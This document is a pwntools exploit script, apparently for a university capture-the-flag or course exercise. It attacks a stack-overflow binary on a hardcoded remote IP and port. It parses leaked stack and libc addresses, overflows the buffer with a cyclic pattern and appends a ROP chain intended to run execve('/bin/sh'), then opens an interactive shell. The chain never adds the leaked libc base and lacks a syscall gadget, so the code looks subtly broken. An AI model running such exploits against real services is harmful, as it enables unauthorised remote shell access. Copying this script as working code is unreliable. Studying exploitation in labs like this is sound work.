#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./stack --host 107.21.135.41 --port 5555
from pwn import *

context.terminal = "zsh"
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./stack')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '107.21.135.41'
port = int(args.PORT or 5555)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments
# RUNPATH:  b'.'

def rop():
    # execve ('/bin/sh', NULL, NULL)
    # rax = 0x3b
    # rdi = &'/bin/sh'
    # rsi = 0
    # rdx = 0
    
    pop_rdi = [0x26b72, 0x1b75aa]
    pop_rsi = [0x27529, 0]
    xor_rdx = [0x142071]
    pop_rax = [0x4a54f, 0x3b]
    
    chain = b''.join(map(p64, pop_rdi + pop_rsi + xor_rdx + pop_rax))
    return chain

io = start()
io.recvuntil(b'base pointer: ')
bp = int(io.recvline(keepends=False), 16)

io.recvuntil(b'will be stored: ')
buff = int(io.recvline(keepends=False), 16)

io.recvuntil(b'address of libc: ')
base = int(io.recvline(keepends=False), 16)

exploit = cyclic(bp + 8 - buff) + rop()

io.recvuntil('ASURITE ID:\n')
io.sendline(exploit)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

